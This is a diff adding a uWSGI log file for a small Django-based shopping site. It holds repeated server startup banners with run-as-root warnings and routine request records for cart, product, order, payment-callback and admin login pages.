@@ -1,0 +1,718 @@
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 18:04:57 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8031 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x202c400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x202c400 pid: 17652 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 17652, cores: 1)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 18:05:54 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8031 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1e87400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1e87400 pid: 17669 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 17669, cores: 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 19:07:57 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8030 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1e49400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1e49400 pid: 17781 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 17781, cores: 1)
+[pid: 17781|app: 0|req: 1/1] 113.88.13.180 () {40 vars in 701 bytes} [Mon Mar 18 11:09:30 2019] GET /bbf/ => generated 83404 bytes in 235 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 17781|app: 0|req: 2/2] 113.88.14.120 () {40 vars in 701 bytes} [Mon Mar 18 11:10:23 2019] GET /bbf/ => generated 83404 bytes in 20 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 17781|app: 0|req: 3/3] 113.88.13.180 () {40 vars in 701 bytes} [Mon Mar 18 11:10:25 2019] GET /bbf/ => generated 83404 bytes in 21 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /axf/
+[pid: 17781|app: 0|req: 4/4] 113.88.14.120 () {40 vars in 701 bytes} [Mon Mar 18 11:10:42 2019] GET /axf/ => generated 2043 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 17781|app: 0|req: 5/5] 113.88.14.120 () {40 vars in 701 bytes} [Mon Mar 18 11:10:50 2019] GET /bbf/ => generated 83404 bytes in 20 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 19:11:31 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8030 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x142c400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x142c400 pid: 17907 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 17907, cores: 1)
+[pid: 17907|app: 0|req: 1/1] 113.88.14.120 () {40 vars in 701 bytes} [Mon Mar 18 11:11:36 2019] GET /bbf/ => generated 83404 bytes in 241 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 17907|app: 0|req: 2/2] 113.88.14.120 () {42 vars in 753 bytes} [Mon Mar 18 11:12:17 2019] GET /bbf/cart/ => generated 15107 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 17907|app: 0|req: 3/3] 113.88.14.120 () {42 vars in 758 bytes} [Mon Mar 18 11:12:18 2019] GET /bbf/cart/ => generated 15107 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 17907|app: 0|req: 4/4] 113.88.14.120 () {42 vars in 758 bytes} [Mon Mar 18 11:12:19 2019] GET /bbf/cart/ => generated 15107 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 17907|app: 0|req: 5/5] 113.88.14.120 () {42 vars in 758 bytes} [Mon Mar 18 11:12:20 2019] GET /bbf/cart/ => generated 15107 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 19:27:22 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:9030 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xe3e400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xe3e400 pid: 17983 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 17983, cores: 1)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 19:32:44 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:9030 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x228a400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x228a400 pid: 18016 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 18016, cores: 1)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 19:48:56 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:9030 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xe51400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0xe51400 pid: 18073 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 18073, cores: 1)
+[pid: 18073|app: 0|req: 1/1] 113.88.14.120 () {40 vars in 701 bytes} [Mon Mar 18 11:49:00 2019] GET /bbf/ => generated 83404 bytes in 225 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 18073|app: 0|req: 2/2] 113.88.13.180 () {38 vars in 700 bytes} [Mon Mar 18 11:49:10 2019] GET /favicon.ico => generated 2064 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 3/3] 113.88.13.180 () {42 vars in 753 bytes} [Mon Mar 18 11:49:13 2019] GET /bbf/cart/ => generated 15107 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 4/4] 113.88.13.180 () {40 vars in 701 bytes} [Mon Mar 18 11:49:28 2019] GET /bbf/ => generated 83404 bytes in 21 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 5/5] 113.88.13.180 () {42 vars in 779 bytes} [Mon Mar 18 11:49:30 2019] GET /bbf/product_details/1/ => generated 28580 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 6/6] 113.88.13.180 () {44 vars in 814 bytes} [Mon Mar 18 11:49:36 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=3 => generated 170 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 7/7] 113.88.13.180 () {42 vars in 771 bytes} [Mon Mar 18 11:49:38 2019] GET /bbf/cart/ => generated 17778 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 8/8] 113.88.13.180 () {42 vars in 771 bytes} [Mon Mar 18 11:49:55 2019] GET /bbf/cart/ => generated 17778 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 9/9] 113.88.13.180 () {42 vars in 771 bytes} [Mon Mar 18 11:50:08 2019] GET /bbf/cart/ => generated 17778 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 10/10] 113.88.13.180 () {44 vars in 801 bytes} [Mon Mar 18 11:50:13 2019] GET /bbf/cart/ => generated 17778 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 11/11] 113.88.13.180 () {42 vars in 771 bytes} [Mon Mar 18 11:50:14 2019] GET /bbf/cart/ => generated 17778 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 12/12] 113.88.13.180 () {42 vars in 784 bytes} [Mon Mar 18 11:50:30 2019] GET /bbf/product_details/1/ => generated 28580 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 18073|app: 0|req: 13/13] 113.88.13.180 () {38 vars in 700 bytes} [Mon Mar 18 11:50:30 2019] GET /favicon.ico => generated 2064 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 14/14] 113.88.13.180 () {44 vars in 814 bytes} [Mon Mar 18 11:50:44 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=1 => generated 170 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 15/15] 113.88.13.180 () {42 vars in 771 bytes} [Mon Mar 18 11:50:45 2019] GET /bbf/cart/ => generated 17778 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 16/16] 113.88.13.180 () {40 vars in 668 bytes} [Mon Mar 18 11:52:59 2019] GET /bbf/cart/ => generated 13940 bytes in 7 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 18073|app: 0|req: 17/17] 113.88.13.180 () {42 vars in 727 bytes} [Mon Mar 18 11:53:08 2019] GET /favicon.ico => generated 2064 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+111111
+[pid: 18073|app: 0|req: 18/18] 113.88.13.180 () {52 vars in 990 bytes} [Mon Mar 18 11:53:14 2019] POST /bbf/login/ => generated 0 bytes in 10 msecs (HTTP/1.1 302) 6 headers in 272 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 19/19] 113.88.13.180 () {46 vars in 869 bytes} [Mon Mar 18 11:53:14 2019] GET /bbf/ => generated 83404 bytes in 23 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 20/20] 113.88.13.180 () {44 vars in 869 bytes} [Mon Mar 18 11:53:30 2019] GET /bbf/product_details/1/ => generated 28580 bytes in 19 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 21/21] 113.88.13.180 () {44 vars in 832 bytes} [Mon Mar 18 11:53:36 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=2 => generated 170 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 22/22] 113.88.13.180 () {44 vars in 861 bytes} [Mon Mar 18 11:53:42 2019] GET /bbf/cart/ => generated 17778 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18073|app: 0|req: 23/23] 106.15.202.177 () {34 vars in 462 bytes} [Mon Mar 18 11:54:08 2019] GET / => generated 2013 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /axf/
+[pid: 18073|app: 0|req: 24/24] 113.88.14.120 () {40 vars in 701 bytes} [Mon Mar 18 11:58:49 2019] GET /axf/ => generated 2043 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 18073|app: 0|req: 25/25] 113.88.14.120 () {38 vars in 700 bytes} [Mon Mar 18 11:58:50 2019] GET /favicon.ico => generated 2064 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 26/26] 113.88.14.120 () {40 vars in 705 bytes} [Mon Mar 18 11:59:03 2019] GET /admin/ => generated 0 bytes in 10 msecs (HTTP/1.1 302) 7 headers in 265 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 27/27] 113.88.14.120 () {40 vars in 742 bytes} [Mon Mar 18 11:59:03 2019] GET /admin/login/?next=/admin/ => generated 1650 bytes in 21 msecs (HTTP/1.1 200) 7 headers in 381 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 28/28] 113.88.13.180 () {48 vars in 952 bytes} [Mon Mar 18 11:59:12 2019] POST /admin/login/?next=/admin/ => generated 1811 bytes in 56 msecs (HTTP/1.1 200) 7 headers in 381 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 29/29] 113.88.14.120 () {48 vars in 952 bytes} [Mon Mar 18 11:59:19 2019] POST /admin/login/?next=/admin/ => generated 1814 bytes in 56 msecs (HTTP/1.1 200) 7 headers in 381 bytes (1 switches on core 0)
+[pid: 18073|app: 0|req: 30/30] 113.88.14.120 () {44 vars in 866 bytes} [Mon Mar 18 12:01:03 2019] GET /bbf/generateorder/ => generated 12424 bytes in 33 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /cache/global/img/gs.gif
+[pid: 18073|app: 0|req: 31/31] 80.82.70.187 () {32 vars in 414 bytes} [Mon Mar 18 12:16:18 2019] GET /cache/global/img/gs.gif => generated 2099 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 20:18:55 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:9030 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x269f400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x269f400 pid: 18124 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 18124, cores: 1)
+[pid: 18124|app: 0|req: 1/1] 113.88.13.180 () {42 vars in 801 bytes} [Mon Mar 18 12:20:06 2019] GET /bbf/cart/ => generated 15107 bytes in 234 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 2/2] 113.88.13.180 () {42 vars in 791 bytes} [Mon Mar 18 12:20:11 2019] GET /bbf/ => generated 83404 bytes in 24 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 3/3] 113.88.13.180 () {44 vars in 869 bytes} [Mon Mar 18 12:20:14 2019] GET /bbf/product_details/1/ => generated 28580 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 4/4] 113.88.13.180 () {44 vars in 832 bytes} [Mon Mar 18 12:20:18 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=3 => generated 170 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 5/5] 113.88.13.180 () {44 vars in 861 bytes} [Mon Mar 18 12:20:19 2019] GET /bbf/cart/ => generated 17778 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 6/6] 113.88.13.180 () {44 vars in 866 bytes} [Mon Mar 18 12:20:22 2019] GET /bbf/generateorder/ => generated 12425 bytes in 38 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 7/7] 113.88.14.120 () {42 vars in 809 bytes} [Mon Mar 18 12:21:33 2019] GET /bbf/returnurl => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 8/8] 113.88.14.120 () {42 vars in 811 bytes} [Mon Mar 18 12:21:33 2019] GET /bbf/returnurl/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 132 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 9/9] 113.88.14.120 () {42 vars in 801 bytes} [Mon Mar 18 12:21:33 2019] GET /bbf/mine/ => generated 12493 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 10/10] 113.88.14.120 () {42 vars in 811 bytes} [Mon Mar 18 12:21:51 2019] GET /bbf/returnurl/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 132 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 11/11] 113.88.14.120 () {42 vars in 801 bytes} [Mon Mar 18 12:21:51 2019] GET /bbf/mine/ => generated 12493 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 12/12] 113.88.14.120 () {42 vars in 815 bytes} [Mon Mar 18 12:22:00 2019] GET /bbf/appnotifyurl => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 123 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 13/13] 113.88.14.120 () {42 vars in 817 bytes} [Mon Mar 18 12:22:00 2019] GET /bbf/appnotifyurl/ => generated 18 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 14/14] 113.88.13.180 () {42 vars in 791 bytes} [Mon Mar 18 12:23:10 2019] GET /bbf/ => generated 83404 bytes in 21 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 15/15] 113.88.13.180 () {44 vars in 869 bytes} [Mon Mar 18 12:23:13 2019] GET /bbf/product_details/1/ => generated 28580 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
